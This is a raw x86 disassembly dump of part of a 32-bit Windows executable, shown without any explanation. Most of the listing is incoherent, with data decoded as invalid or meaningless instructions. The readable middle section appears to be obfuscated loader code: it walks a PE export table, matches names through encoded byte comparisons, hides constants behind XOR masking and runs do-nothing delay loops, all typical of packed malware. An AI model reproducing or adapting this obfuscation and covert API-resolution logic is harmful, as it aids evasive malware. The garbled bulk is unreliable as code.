  407901:	add    eax,DWORD PTR [esi+0x4acd2060]
  407907:	fs jp  0x40792a
  40790a:	lahf   
  40790b:	lds    ebx,FWORD PTR ds:0xbfe96996
  407911:	or     al,0x79
  407913:	aas    
  407914:	cmp    eax,0x20aebd38
  407919:	arpl   WORD PTR cs:[eax],cx
  40791c:	test   BYTE PTR [edi],bl
  40791e:	mov    bh,0x4e
  407920:	sbb    ch,BYTE PTR [ecx-0x64fb6c9f]
  407926:	jg     0x4078ed
  407928:	dec    ebx
  407929:	inc    esi
  40792a:	in     al,dx
  40792b:	stc    
  40792c:	iret   
  40792d:	sbb    cl,BYTE PTR [ecx]
  40792f:	sbb    al,0x29
  407931:	and    esi,esp
  407933:	cmp    al,0xc9
  407935:	clc    
  407936:	data16 cld 
  407938:	outs   dx,DWORD PTR ds:[esi]
  407939:	imul   esi,DWORD PTR [ecx-0x62e168a5],0xd47dc82e
  407943:	(bad)  
  407944:	ror    BYTE PTR [edi-0x9],1
  407947:	push   es
  407948:	push   0xffffff9a
  40794a:	pop    edx
  40794b:	fs ret 0x7a0
  40794f:	cmp    BYTE PTR [eax-0x5aac1363],bl
  407955:	mov    eax,ds:0xa9fb34b5
  40795a:	sbb    DWORD PTR [ecx+eax*4-0x48],0xfffffffe
  40795f:	cli    
  407960:	lea    ecx,[edi-0x4d]
  407963:	dec    ebx
  407964:	add    DWORD PTR [ecx],esp
  407966:	mov    ah,0x75
  407968:	cmp    dh,0x55
  40796b:	rol    BYTE PTR [ebx],cl
  40796d:	sub    BYTE PTR [edi+0x7c9650a1],bl
  407973:	push   ecx
  407974:	add    ecx,DWORD PTR [ecx]
  407976:	fst    DWORD PTR [edx+eax*1+0x28]
  40797a:	mov    al,ds:0xb7064b4
  40797f:	inc    edx
  407980:	sti    
  407981:	hlt    
  407982:	or     edx,DWORD PTR [edx]
  407984:	sub    al,0x89
  407986:	mov    ds:0x3bc5743e,eax
  40798b:	xor    eax,edi
  40798d:	ret    
  40798e:	push   ebp
  40798f:	push   esi
  407990:	scas   al,BYTE PTR es:[edi]
  407991:	or     eax,0xa961f7e4
  407996:	scas   eax,DWORD PTR es:[edi]
  407997:	sub    DWORD PTR [eax],edx
  407999:	lea    ebx,[ebx+eiz*4-0x4a]
  40799d:	aaa    
  40799e:	inc    ecx
  40799f:	jae    0x4079f1
  4079a1:	js     0x407979
  4079a3:	xchg   edi,eax
  4079a4:	pop    edi
  4079a5:	mov    ch,0xac
  4079a7:	sahf   
  4079a8:	je     0x4079e0
  4079aa:	mov    ebx,DWORD PTR [ecx+eax*8]
  4079ad:	cld    
  4079ae:	jmp    0x90b3:0xff802b0b
  4079b5:	(bad)  
  4079b6:	adc    esp,DWORD PTR [edi+0x7b]
  4079b9:	outs   dx,BYTE PTR ds:[esi]
  4079ba:	in     al,dx
  4079bb:	aaa    
  4079bc:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079be:	(bad)  
  4079bf:	out    dx,al
  4079c0:	mov    cl,bl
  4079c2:	dec    ebx
  4079c3:	jle    0x4079c0
  4079c5:	and    al,BYTE PTR [eax+ecx*2-0x77]
  4079c9:	adc    BYTE PTR [eax],ch
  4079cb:	pop    es
  4079cc:	push   ss
  4079cd:	outs   dx,DWORD PTR ds:[esi]
  4079ce:	popa   
  4079cf:	sbb    dh,BYTE PTR [ebp+0x3f848cbf]
  4079d5:	stos   DWORD PTR es:[edi],eax
  4079d6:	add    DWORD PTR [esi],esi
  4079d8:	add    al,0x9e
  4079da:	fldenv [edi]
  4079dc:	aaa    
  4079dd:	push   eax
  4079de:	pop    ebx
  4079df:	jb     0x4079f5
  4079e1:	(bad)  
  4079e2:	rol    BYTE PTR [eax+0x7c],0xfd
  4079e6:	sbb    DWORD PTR [eax],esi
  4079e8:	aaa    
  4079e9:	(bad)  
  4079ea:	iret   
  4079eb:	or     esp,ecx
  4079ed:	and    al,0x86
  4079ef:	in     al,0xbf
  4079f1:	xor    BYTE PTR [esi+ebx*1-0x5e],0xd
  4079f6:	push   cs
  4079f7:	pop    ss
  4079f8:	push   edi
  4079f9:	mov    ebx,0x837d35b9
  4079fe:	adc    ebx,DWORD PTR [ebx]
  407a00:	sahf   
  407a01:	shl    al,cl
  407a03:	cmp    edx,DWORD PTR [eax]
  407a05:	jecxz  0x407a59
  407a07:	cdq    
  407a08:	adc    ah,BYTE PTR [edi]
  407a0a:	push   esp
  407a0b:	or     al,0x96
  407a0d:	data16 test BYTE PTR [esi+ecx*1],bl
  407a11:	int    0xfd
  407a13:	bound  ebx,QWORD PTR [eax+0x4e66622d]
  407a19:	and    al,0x46
  407a1b:	xlat   BYTE PTR ds:[ebx]
  407a1c:	add    bl,bh
  407a1e:	std    
  407a1f:	loopne 0x407a96
  407a21:	popf   
  407a22:	lds    esp,FWORD PTR [esi-0x706604c]
  407a28:	add    al,0xac
  407a2a:	inc    edx
  407a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a2c:	adc    eax,0xd984b4fb
  407a31:	jge    0x4079d6
  407a33:	test   BYTE PTR [ebx],dh
  407a35:	call   0xc49a4c2b
  407a3a:	mov    cl,0x40
  407a3c:	repz pop esi
  407a3e:	sbb    ah,BYTE PTR [ebx+0x4f53320a]
  407a44:	(bad)  
  407a45:	and    BYTE PTR fs:[ecx+0x6a377cf6],bh
  407a4c:	cmp    ebp,edx
  407a4e:	ret    
  407a4f:	out    dx,eax
  407a50:	cmc    
  407a51:	js     0x4079ed
  407a53:	aam    0x19
  407a55:	(bad)  
  407a56:	xor    DWORD PTR [esi-0x6bb4724e],ebx
  407a5c:	icebp  
  407a5d:	ins    BYTE PTR es:[edi],dx
  407a5e:	(bad)  
  407a5f:	jb     0x407a06
  407a61:	mov    dl,0xa2
  407a63:	dec    edi
  407a64:	adc    DWORD PTR [eax+ebx*8-0x49404268],ecx
  407a6b:	sti    
  407a6c:	push   ebx
  407a6d:	push   ecx
  407a6e:	xor    al,0x3
  407a70:	daa    
  407a71:	lahf   
  407a72:	int    0x5e
  407a74:	mov    cl,0x39
  407a76:	cmp    al,0x86
  407a78:	fild   QWORD PTR [ecx+ecx*1-0x45699467]
  407a7f:	popa   
  407a80:	call   0x1ec0bd0c
  407a85:	add    eax,0xc9e2734b
  407a8b:	or     al,0x5d
  407a8d:	xor    ebx,DWORD PTR [ebp-0xa]
  407a90:	add    BYTE PTR [eax],cl
  407a92:	mov    eax,DWORD PTR [eax-0x68]
  407a95:	or     bl,BYTE PTR [esi]
  407a97:	arpl   WORD PTR [esp+edi*8],ax
  407a9a:	mul    BYTE PTR [ebp+edx*2-0x6b]
  407a9e:	outs   dx,DWORD PTR ds:[esi]
  407a9f:	fadd   QWORD PTR [ebp+0x21]
  407aa2:	test   al,0xe
  407aa4:	cli    
  407aa5:	faddp  st(0),st
  407aa7:	xchg   DWORD PTR [ebp+0x42],ecx
  407aaa:	mul    BYTE PTR [edx+0x2422fd2e]
  407ab0:	fiadd  DWORD PTR [eax+0x58fdb0b5]
  407ab6:	sub    al,0x5d
  407ab8:	push   esi
  407ab9:	das    
  407aba:	ins    BYTE PTR es:[edi],dx
  407abb:	push   esp
  407abc:	in     al,dx
  407abd:	call   0xf90bb9b3
  407ac2:	les    ecx,FWORD PTR [ecx]
  407ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ac5:	fistp  DWORD PTR [ebp-0x68]
  407ac8:	(bad)  
  407ac9:	push   ds
  407aca:	push   ss
  407acb:	cdq    
  407acc:	mov    ss,esi
  407ace:	sbb    BYTE PTR [ebx-0x24],al
  407ad1:	lods   eax,DWORD PTR ds:[esi]
  407ad2:	rcl    bh,1
  407ad4:	iret   
  407ad5:	jg     0x407af7
  407ad7:	xor    BYTE PTR [eax],0x34
  407ada:	dec    edi
  407adb:	mov    esi,0x6189d5bf
  407ae0:	dec    esi
  407ae1:	ret    
  407ae2:	sahf   
  407ae3:	cs push 0x4b01214c
  407ae9:	jle    0x407b56
  407aeb:	sar    bh,0x55
  407aee:	arpl   WORD PTR [esi-0x53],si
  407af1:	add    al,0xc2
  407af3:	push   ebp
  407af4:	cmp    al,0x9f
  407af6:	das    
  407af7:	mov    bh,0x13
  407af9:	gs out 0xfa,al
  407afc:	mov    WORD PTR ss:[ebx-0x25ded1f2],?
  407b03:	icebp  
  407b04:	out    0xc5,al
  407b06:	test   BYTE PTR [edi-0x3eb00488],0xd
  407b0d:	repnz inc ebp
  407b0f:	add    BYTE PTR [ebp-0x2],ch
  407b12:	jmp    0x407ac1
  407b14:	gs inc ecx
  407b16:	mov    ds:0xcac5d4cb,eax
  407b1b:	add    eax,0xa5a8158d
  407b20:	jp     0x407b6c
  407b22:	cld    
  407b23:	mov    esi,esp
  407b25:	xchg   al,dh
  407b27:	push   ss
  407b28:	int3   
  407b29:	pop    ebx
  407b2a:	sbb    edx,eax
  407b2c:	icebp  
  407b2d:	push   esi
  407b2e:	push   cs
  407b2f:	fwait
  407b30:	add    eax,0x7816f6ee
  407b35:	aaa    
  407b36:	pusha  
  407b37:	(bad)  
  407b38:	mov    ds:0x84318a3f,al
  407b3d:	xor    edi,ecx
  407b3f:	add    edi,0x3272db
  407b45:	not    edi
  407b47:	and    eax,edi
  407b49:	movsx  di,BYTE PTR [eax+0x1]
  407b4e:	mov    ebx,0x3b4a
  407b53:	sub    di,bx
  407b56:	mov    ebx,0x8a87
  407b5b:	xor    di,bx
  407b5e:	mov    ebx,0x4f97
  407b63:	cmp    di,bx
  407b66:	jne    0x407b8e
  407b6c:	movsx  di,BYTE PTR [eax]
  407b70:	mov    ebx,0x3b4a
  407b75:	sub    di,bx
  407b78:	mov    ebx,0x8a87
  407b7d:	xor    di,bx
  407b80:	mov    ebx,0x4f84
  407b85:	cmp    di,bx
  407b88:	je     0x407b9e
  407b8e:	mov    edi,DWORD PTR [ebp-0x10]
  407b91:	xor    edi,ecx
  407b93:	mov    ebx,esi
  407b95:	sub    ebx,edi
  407b97:	add    eax,ebx
  407b99:	jmp    0x407b49
  407b9e:	mov    esi,DWORD PTR [ebp-0x14]
  407ba1:	mov    esi,DWORD PTR [esi]
  407ba3:	mov    edi,DWORD PTR [eax+0x3c]
  407ba6:	lea    esi,[edi+esi*8+0x78]
  407baa:	mov    esi,DWORD PTR [esi+eax*1]
  407bad:	mov    DWORD PTR [ebp-0x8],esi
  407bb0:	mov    esi,DWORD PTR [ebp+0x8]
  407bb3:	xor    esi,ecx
  407bb5:	add    esi,edx
  407bb7:	mov    DWORD PTR [ebp-0x14],esi
  407bba:	mov    esi,DWORD PTR [ebp+0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x8]
  407bc0:	xor    esi,ecx
  407bc2:	add    esi,edx
  407bc4:	pop    ebx
  407bc5:	cmp    edi,esi
  407bc7:	jne    0x407be5
  407bcd:	mov    eax,DWORD PTR [ebp+0xc]
  407bd0:	xor    eax,ecx
  407bd2:	mov    ecx,DWORD PTR [ebp-0x8]
  407bd5:	add    eax,edx
  407bd7:	imul   eax,ecx
  407bda:	mov    DWORD PTR [ebp-0x8],eax
  407bdd:	push   DWORD PTR [ebp+0x18]
  407be0:	jmp    0x407c39
  407be5:	mov    ecx,DWORD PTR [ebp-0x8]
  407be8:	add    ecx,eax
  407bea:	mov    DWORD PTR [ebp-0x14],ecx
  407bed:	mov    ecx,DWORD PTR [ebp-0x14]
  407bf0:	mov    ecx,DWORD PTR [ecx+0xc]
  407bf3:	movsx  cx,BYTE PTR [ecx+eax*1]
  407bf8:	mov    edx,0x3b4a
  407bfd:	sub    cx,dx
  407c00:	mov    edx,0x8a87
  407c05:	xor    cx,dx
  407c08:	mov    edx,0x4f86
  407c0d:	cmp    cx,dx
  407c10:	jne    0x407bdd
  407c16:	mov    ecx,DWORD PTR ds:0x4163b4
  407c1c:	mov    ecx,DWORD PTR [ecx+0x198]
  407c22:	mov    DWORD PTR [ecx],eax
  407c24:	jmp    0x407c4a
  407c29:	mov    ecx,DWORD PTR [ebp+0x18]
  407c2c:	cmp    ecx,0xf89c85b1
  407c32:	jne    0x407c4a
  407c38:	push   eax
  407c39:	push   DWORD PTR [ebp+0x14]
  407c3c:	push   DWORD PTR [ebp+0x10]
  407c3f:	push   DWORD PTR [ebp+0xc]
  407c42:	push   DWORD PTR [ebp+0x8]
  407c45:	call   0x405399
  407c4a:	pop    edi
  407c4b:	pop    esi
  407c4c:	leave  
  407c4d:	ret    0x14
  407c50:	push   ebp
  407c51:	mov    ebp,esp
  407c53:	push   ecx
  407c54:	mov    DWORD PTR [ebp-0x4],0xf89c85bc
  407c5b:	and    DWORD PTR ds:0x413c02,0x414004
  407c65:	mov    eax,DWORD PTR [ebp-0x4]
  407c68:	mov    edx,DWORD PTR [ebp+0x10]
  407c6b:	mov    ecx,0x7510894
  407c70:	xor    eax,ecx
  407c72:	add    eax,0x3272dc
  407c77:	mov    DWORD PTR [edx],eax
  407c79:	movzx  edx,WORD PTR ds:0x413c7c
  407c80:	and    edx,DWORD PTR ds:0x413cf4
  407c86:	mov    DWORD PTR ds:0x413c7c,edx
  407c8c:	mov    eax,DWORD PTR [ebp+0xc]
  407c8f:	sbb    DWORD PTR ds:0x413c02,0x413c0a
  407c99:	xor    eax,ecx
  407c9b:	adc    edx,DWORD PTR ds:0x414010
  407ca1:	push   esi
  407ca2:	sub    edx,DWORD PTR ds:0x413c84
  407ca8:	mov    esi,DWORD PTR [ebp+0x10]
  407cab:	movzx  edx,WORD PTR ds:0x414010
  407cb2:	sbb    DWORD PTR ds:0x413cf4,edx
  407cb8:	mov    edx,0x3272dc
  407cbd:	neg    DWORD PTR ds:0x413d20
  407cc3:	add    eax,edx
  407cc5:	xor    DWORD PTR ds:0x413c06,0x413c1a
  407ccf:	mov    DWORD PTR [esi+0x4],eax
  407cd2:	mov    eax,DWORD PTR [ebp+0x14]
  407cd5:	mov    esi,DWORD PTR [ebp+0x10]
  407cd8:	mov    DWORD PTR [esi+0x8],eax
  407cdb:	mov    eax,DWORD PTR [ebp+0x18]
  407cde:	mov    esi,DWORD PTR [ebp+0x10]
  407ce1:	mov    DWORD PTR [esi+0xc],eax
  407ce4:	mov    eax,DWORD PTR [ebp+0x1c]
  407ce7:	mov    esi,DWORD PTR [ebp+0x10]
  407cea:	mov    DWORD PTR [esi+0x10],eax
  407ced:	mov    eax,DWORD PTR [ebp+0x8]
  407cf0:	xor    eax,ecx
  407cf2:	add    eax,edx
  407cf4:	pop    esi
  407cf5:	leave  
  407cf6:	ret    0x18
  407cf9:	push   ebp
  407cfa:	mov    ebp,esp
  407cfc:	push   ecx
  407cfd:	and    DWORD PTR ds:0x413d34,0x0
  407d07:	xor    eax,eax
  407d09:	add    eax,DWORD PTR ds:0x413d34
  407d0f:	inc    eax
  407d10:	mov    ds:0x413d34,eax
  407d15:	cmp    DWORD PTR ds:0x413d34,0x10
  407d1c:	jne    0x407d30
  407d22:	push   DWORD PTR [ebp-0x14]
  407d25:	push   0x4160bf
  407d2a:	call   DWORD PTR ds:0x41678c
  407d30:	cmp    DWORD PTR ds:0x413d34,0xf
  407d37:	jne    0x407d48
  407d3d:	mov    eax,ds:0x413d34
  407d42:	inc    eax
  407d43:	mov    ds:0x413d34,eax
  407d48:	cmp    DWORD PTR ds:0x413d34,0x1e
  407d4f:	jb     0x407d07
  407d55:	sbb    eax,DWORD PTR ds:0x413bf6
  407d5b:	push   ecx
  407d5c:	mov    DWORD PTR [ebp-0x8],0xf89c85b0
  407d63:	and    DWORD PTR ds:0x413c06,0x0
  407d6d:	jmp    0x407d7f
  407d72:	mov    edx,DWORD PTR ds:0x413c06
  407d78:	inc    edx
  407d79:	mov    DWORD PTR ds:0x413c06,edx
  407d7f:	cmp    DWORD PTR ds:0x413c06,0x1d
  407d86:	jae    0x407dc8
  407d8c:	cmp    DWORD PTR ds:0x413c06,0x27
  407d93:	jne    0x407dbd
  407d99:	push   0x1c64
  407d9e:	push   0x413c06
  407da3:	push   0x752e
  407da8:	push   0x4160cf
  407dad:	push   0x55a9
  407db2:	push   0x2dee
  407db7:	call   DWORD PTR ds:0x416790
  407dbd:	jmp    0x407d72
  407dc2:	and    eax,DWORD PTR ds:0x413ce0
  407dc8:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  407dcf:	mov    DWORD PTR ds:0x413d34,0x14
  407dd9:	cmp    DWORD PTR ds:0x413d34,0x0
  407de0:	je     0x407e29
  407de6:	cmp    DWORD PTR ds:0x413d34,0x9
  407ded:	jne    0x407dfe
  407df3:	push   0x2bdc
  407df8:	call   DWORD PTR ds:0x416798
  407dfe:	cmp    DWORD PTR ds:0x413d34,0xa
  407e05:	jne    0x407e19
  407e0b:	xor    eax,eax
  407e0d:	add    eax,DWORD PTR ds:0x413d34
  407e13:	dec    eax
  407e14:	mov    ds:0x413d34,eax
  407e19:	mov    eax,ds:0x413d34
  407e1e:	dec    eax
  407e1f:	mov    ds:0x413d34,eax
  407e24:	jmp    0x407dd9
  407e29:	mov    eax,DWORD PTR [ebp-0x4]
  407e2c:	push   esi
  407e2d:	mov    esi,DWORD PTR [ebp-0x8]
  407e30:	mov    edx,0x7510894
  407e35:	xor    eax,edx
  407e37:	xor    esi,edx
  407e39:	mov    ecx,0x3272dc
  407e3e:	add    esi,ecx
  407e40:	add    eax,ecx
  407e42:	imul   eax,esi
  407e45:	mov    esi,DWORD PTR [ebp+0xc]
  407e48:	jmp    0x40a1fd
  407e4d:	mov    ds:0x72fcde4e,al
  407e52:	in     al,dx
  407e53:	xor    dl,0xf9
  407e56:	mov    ebp,0xd23570e0
  407e5b:	cmp    dh,dl
  407e5d:	iret   
  407e5e:	and    bh,BYTE PTR [esp+edi*2-0x2c]
  407e62:	pop    edi
  407e63:	jl     0x407ee1
  407e65:	xor    eax,0xa9e31982
  407e6a:	test   BYTE PTR [eax],0x61
  407e6d:	inc    esi
  407e6e:	popa   
  407e6f:	jmp    0x6d9b:0x9683d8cb
  407e76:	xor    ebp,0x4f
  407e79:	adc    BYTE PTR [edi+0x2d],bh
  407e7c:	aaa    
  407e7d:	xchg   esp,eax
  407e7e:	popa   
  407e7f:	push   ecx
  407e80:	dec    ebx
  407e81:	js     0x407e5e
  407e83:	mov    DWORD PTR ds:0x1db582f3,ecx
  407e89:	mov    dl,0x97
  407e8b:	cs jmp 0x407efe
  407e8e:	mov    eax,ds:0x4c336dcc
  407e93:	jne    0x407e91
  407e95:	in     al,0xb1
  407e97:	call   0x5543:0xbf2aa891
  407e9e:	mov    DWORD PTR [esi+0x3],esi
  407ea1:	bound  ebp,QWORD PTR [ecx+0x7d]
  407ea4:	pop    ds
  407ea5:	add    eax,0x7c3089a2
  407eaa:	out    dx,eax
  407eab:	dec    edx
  407eac:	(bad)  [edi-0x23abab00]
  407eb2:	sub    edi,edx
  407eb4:	mov    WORD PTR [edi-0x6b8d8584],ss
  407eba:	rol    eax,0x66
  407ebd:	dec    eax
  407ebe:	mov    ebx,0x70829fdc
  407ec3:	repnz in eax,dx
  407ec5:	mov    dl,0x22
  407ec7:	and    DWORD PTR [eax+eax*1-0x18eac9d1],ecx
  407ece:	cld    
  407ecf:	sbb    al,0x13
  407ed1:	xchg   esi,eax
  407ed2:	lahf   
  407ed3:	(bad)  
  407ed5:	pinsrw mm0,WORD PTR [edx+0x50],0xa1
  407eda:	out    0x5a,eax
  407edc:	inc    eax
  407edd:	sahf   
  407ede:	pop    ebp
  407edf:	repnz int 0x6
  407ee2:	in     eax,dx
  407ee3:	nop
  407ee4:	test   eax,0x9e9f2bdd
  407ee9:	aad    0x65
  407eeb:	repnz mov ds:0xb9ccb771,al
  407ef1:	cmp    al,0xfa
  407ef3:	test   BYTE PTR [ecx-0x607f280b],bl
  407ef9:	loopne 0x407ef8
  407efb:	inc    ebx
  407efc:	popf   
  407efd:	into   
  407efe:	addr16 jns 0x407e8d
  407f01:	into   
  407f02:	dec    edx
  407f03:	dec    eax
  407f04:	test   BYTE PTR [ebp+0x72aeb18c],bh
  407f0a:	jae    0x407edc
  407f0c:	inc    esi
  407f0d:	and    BYTE PTR [edi-0x36],cl
  407f10:	xchg   esi,eax
  407f11:	dec    edi
  407f12:	fstcw  WORD PTR [ecx-0x6ba3790d]
  407f19:	xchg   edx,eax
  407f1a:	ins    BYTE PTR es:[edi],dx
  407f1b:	vmovupd YMMWORD PTR ds:0x96a470f4,ymm6
  407f23:	sub    al,0x53
  407f25:	aas    
  407f26:	adc    DWORD PTR [eax-0x4fdb3c25],edi
  407f2c:	mov    ecx,DWORD PTR [esi+0x78]
  407f2f:	jmp    0x8205:0xa9b1dd8a
  407f36:	xor    DWORD PTR [edx+0x28],ecx
  407f39:	or     DWORD PTR [eax-0xbf7ea23],ebx
  407f3f:	hlt    
  407f40:	test   al,0x3f
  407f42:	sub    DWORD PTR [edi+0x3e],0xefcd3e84
  407f49:	lods   al,BYTE PTR ds:[esi]
  407f4a:	xchg   edi,eax
  407f4b:	pushf  
  407f4c:	lods   al,BYTE PTR ds:[esi]
  407f4d:	add    ebp,0x40
  407f50:	ja     0x407f34
  407f52:	inc    eax
  407f53:	mov    ebx,0xcfd05aef
  407f58:	add    DWORD PTR [ecx-0x7588a2db],ebx
  407f5e:	sub    al,0x3b
  407f60:	out    0xe8,eax
  407f62:	push   ss
  407f63:	imul   ebp,DWORD PTR [eax-0x7b],0x34
  407f67:	or     DWORD PTR [eax],esp
  407f69:	adc    al,0x4c
  407f6b:	pop    ebx
  407f6c:	or     bh,dl
  407f6e:	ins    DWORD PTR es:[edi],dx
  407f6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f70:	mov    esi,0x67a41cbe
  407f75:	retf   
  407f76:	adc    edi,esp
  407f78:	cmp    dh,al
  407f7a:	mov    al,0xab
  407f7c:	jge    0x407ff6
  407f7e:	mov    bh,0xba
  407f80:	jecxz  0x407f3a
  407f82:	nop
  407f83:	mov    ds:0xc785fbde,al
  407f88:	and    eax,0x2b4c177
  407f8d:	mov    al,0x19
  407f8f:	pop    ecx
  407f90:	cmp    ecx,esp
  407f92:	dec    ebx
  407f93:	mov    cl,0xde
  407f95:	test   DWORD PTR [esi+0x6c5ad18],edi
  407f9b:	xchg   ebp,eax
  407f9c:	pop    eax
  407f9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f9e:	or     BYTE PTR [ecx+edi*1+0x7a2dc759],cl
  407fa5:	mov    ah,0x27
  407fa7:	jge    0x407fa6
  407fa9:	(bad)  
  407faa:	sub    dh,BYTE PTR [ebx-0x7d264237]
  407fb0:	fwait
  407fb1:	mov    ebx,es
  407fb3:	inc    esp
  407fb4:	push   es
  407fb5:	test   DWORD PTR [ebp+0x74e8bba8],edx
  407fbb:	aad    0xc2
  407fbd:	jns    0x408018
  407fbf:	mov    eax,ds:0x755083
  407fc4:	das    
  407fc5:	nop/reserved BYTE PTR [ecx]
  407fc8:	lods   al,BYTE PTR ds:[esi]
  407fc9:	dec    edx
  407fca:	loope  0x407fdc
  407fcc:	xchg   DWORD PTR [edi+0x5a],edi
  407fcf:	ret    0x126c
  407fd2:	into   
  407fd3:	cs call 0x1dac:0xc721fd34
  407fdb:	xor    cl,BYTE PTR [ebx+ecx*1]
  407fde:	test   al,0x3
  407fe0:	test   BYTE PTR [ebp-0x75e72258],0x15
  407fe7:	sub    BYTE PTR [ebx+0xf96d9d0],dl
  407fed:	call   FWORD PTR [ebx-0x38]
  407ff0:	enter  0x92fd,0x30
  407ff4:	xor    bh,dh
  407ff6:	push   ds
  407ff7:	mov    cl,0xda
  407ff9:	shl    BYTE PTR [esi-0x715ae6a1],0x9
  408000:	stc    
  408001:	pop    ss
  408002:	dec    edi
  408003:	or     eax,DWORD PTR [esp+ecx*8-0x9]
  408007:	dec    edx
  408008:	dec    eax
  408009:	pop    ebx
  40800a:	test   al,0xda
  40800c:	dec    ecx
  40800d:	test   al,0x9d
  40800f:	pop    ss
  408010:	mov    WORD PTR [edi+0x7f],?
  408013:	popa   
  408014:	(bad)  [ebp-0x2e41b8a5]
  40801a:	js     0x407fbc
  40801c:	std    
  40801d:	nop
  40801e:	es repnz xchg ebx,eax
  408021:	shl    dl,cl
  408023:	xor    ch,BYTE PTR [edx+0x68]
  408026:	outs   dx,DWORD PTR ds:[esi]
  408027:	icebp  
  408028:	retf   
  408029:	stc    
  40802a:	cmp    bh,ah
  40802c:	sbb    DWORD PTR [edx-0x3c74d092],ebx
  408032:	ret    
  408033:	jp     0x407fca
  408035:	push   ss
  408036:	nop
  408037:	dec    ebx
  408038:	jp     0x407fd9
  40803a:	test   eax,0x4e340f8
  40803f:	cmp    eax,DWORD PTR [ebx+eax*1]
  408042:	sar    BYTE PTR [edi+esi*4],1
  408045:	push   eax
  408046:	js     0x407feb
  408048:	lods   al,BYTE PTR ds:[esi]
  408049:	aaa    
  40804a:	sbb    BYTE PTR [ebx],cl
  40804c:	cli    
  40804d:	scas   eax,DWORD PTR es:[edi]
  40804e:	cmp    eax,0x54347608
  408053:	inc    DWORD PTR ds:0x285288fd
  408059:	shl    ecx,cl
  40805b:	jnp    0x407fe7
  40805d:	inc    esi
  40805e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40805f:	mov    bl,0xb3
  408061:	ss jne 0x4080c7
  408064:	mov    al,0x8d
  408066:	add    eax,0x6179bba2
  40806b:	int    0x49
  40806d:	pusha  
  40806e:	push   ecx
  40806f:	adc    bh,dl
  408071:	mov    ebp,0xcdd4e6b2
  408076:	fadd   st(3),st
  408078:	inc    ebp
  408079:	adc    DWORD PTR [edx+0x24],ebx
  40807c:	jno    0x40805b
  40807e:	or     ebp,DWORD PTR ds:0x2a41ff21
  408084:	xor    edx,ebp
  408086:	mov    dl,0x5
  408088:	fist   DWORD PTR [esp+ecx*8+0x6769b6cb]
  40808f:	dec    ecx
  408090:	out    0x99,al
  408092:	enter  0x6689,0xe2
  408096:	je     0x408025
  408098:	xlat   BYTE PTR ds:[ebx]
  408099:	jnp    0x408085
  40809b:	push   ss
  40809c:	sbb    BYTE PTR [eax+0x65832098],ch
  4080a2:	push   ebx
  4080a3:	add    DWORD PTR [ecx+0x3e046bcb],edi
  4080a9:	dec    ebx
  4080aa:	pop    ebp
  4080ab:	sub    eax,0x64cc9d63
  4080b0:	add    al,0xd1
  4080b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080b3:	test   ecx,0xf4498878
  4080b9:	repz lock mov edi,0xdb8cccef
  4080c0:	mov    al,ds:0x80413f6
  4080c5:	aaa    
  4080c6:	push   edx
  4080c7:	fdiv   QWORD PTR ds:0x2884e57
  4080cd:	ins    BYTE PTR es:[edi],dx
  4080ce:	popa   
  4080cf:	pop    eax
  4080d0:	jnp    0x4080fa
  4080d2:	loope  0x4080b8
  4080d4:	pop    ss
  4080d5:	leave  
  4080d6:	sahf   
  4080d7:	mov    bh,0x5e
  4080d9:	test   BYTE PTR [ebp+0x60],dh
  4080dc:	xchg   DWORD PTR [edi+0x3d0f7c42],eax
  4080e2:	jns    0x408102
  4080e4:	jo     0x408157
  4080e6:	pop    esi
  4080e7:	int3   
  4080e8:	jnp    0x408108
  4080ea:	and    eax,0x9d8fe26a
  4080ef:	rcl    DWORD PTR [edx],1
  4080f1:	mov    ds:0x8b017ad2,al
  4080f6:	stos   BYTE PTR es:[edi],al
  4080f7:	pop    esi
  4080f8:	dec    esp
  4080f9:	pop    edx
  4080fa:	ret    
  4080fb:	shl    BYTE PTR [eax+0x6174d0a7],1
  408101:	test   DWORD PTR [ebx-0x3094f6b6],esp
  408107:	pop    ebp
  408108:	jmp    0x408098
  40810a:	pop    es
  40810b:	daa    
  40810c:	pop    ebp
  40810d:	ret    0x7c2d
  408110:	imul   ebp,DWORD PTR [ebx+0x47b5da31],0xfffffff8
  408117:	pusha  
  408118:	test   ebp,ebp
  40811a:	jg     0x408130
  40811c:	mov    ah,0x48
  40811e:	dec    esi
  40811f:	call   0x7764:0xd5712eda
  408126:	cmc    
  408127:	ja     0x4080ac
  408129:	retf   0x1260
  40812c:	sub    eax,DWORD PTR [ebx]
  40812e:	add    al,BYTE PTR [esp+ecx*1-0x58908109]
  408135:	sub    eax,0xb0f840ee
  40813a:	add    DWORD PTR [edx],0xffffffdf
  40813d:	push   ebx
  40813e:	mov    ss,WORD PTR [edx+eiz*2+0xcdac4cb]
  408145:	lahf   
  408146:	test   DWORD PTR [edx+0x55739c51],ebp
  40814c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40814d:	repz pusha 
  40814f:	test   eax,0xa1e311b
  408154:	pop    esi
  408155:	leave  
  408156:	sbb    eax,0x9f2ea117
  40815b:	lock data16 mov BYTE PTR [edx+0xa],ch
  408160:	adc    eax,DWORD PTR [edx+0x6e]
  408163:	mov    ebx,0x8e154f82
  408168:	and    al,0xba
  40816a:	dec    BYTE PTR [ebp-0x5e081d49]
  408170:	add    al,0xdb
  408172:	mov    eax,ds:0x2e355108
  408177:	inc    esp
  408178:	cmp    al,BYTE PTR [edx]
  40817a:	aam    0x6c
  40817c:	mov    ebp,edi
  40817e:	push   ds
  40817f:	les    esp,FWORD PTR [esi-0x2b]
  408182:	xor    cl,al
  408184:	sbb    eax,0x2836bd81
  408189:	das    
  40818a:	push   ds
  40818b:	and    ebp,edi
  40818d:	mov    ds:0xd76d46f3,eax
  408192:	(bad)
  408196:	adc    DWORD PTR [edi+0x4fe6f843],ebp
  40819c:	and    ah,BYTE PTR [eax+eax*1+0x6c03df1a]
  4081a3:	adc    dl,0x57
  4081a6:	out    0xe0,al
  4081a8:	and    al,0xc4
  4081aa:	int    0xeb
  4081ac:	or     eax,0xc834a79
  4081b1:	sub    ecx,0xffffffee
  4081b4:	xchg   esp,eax
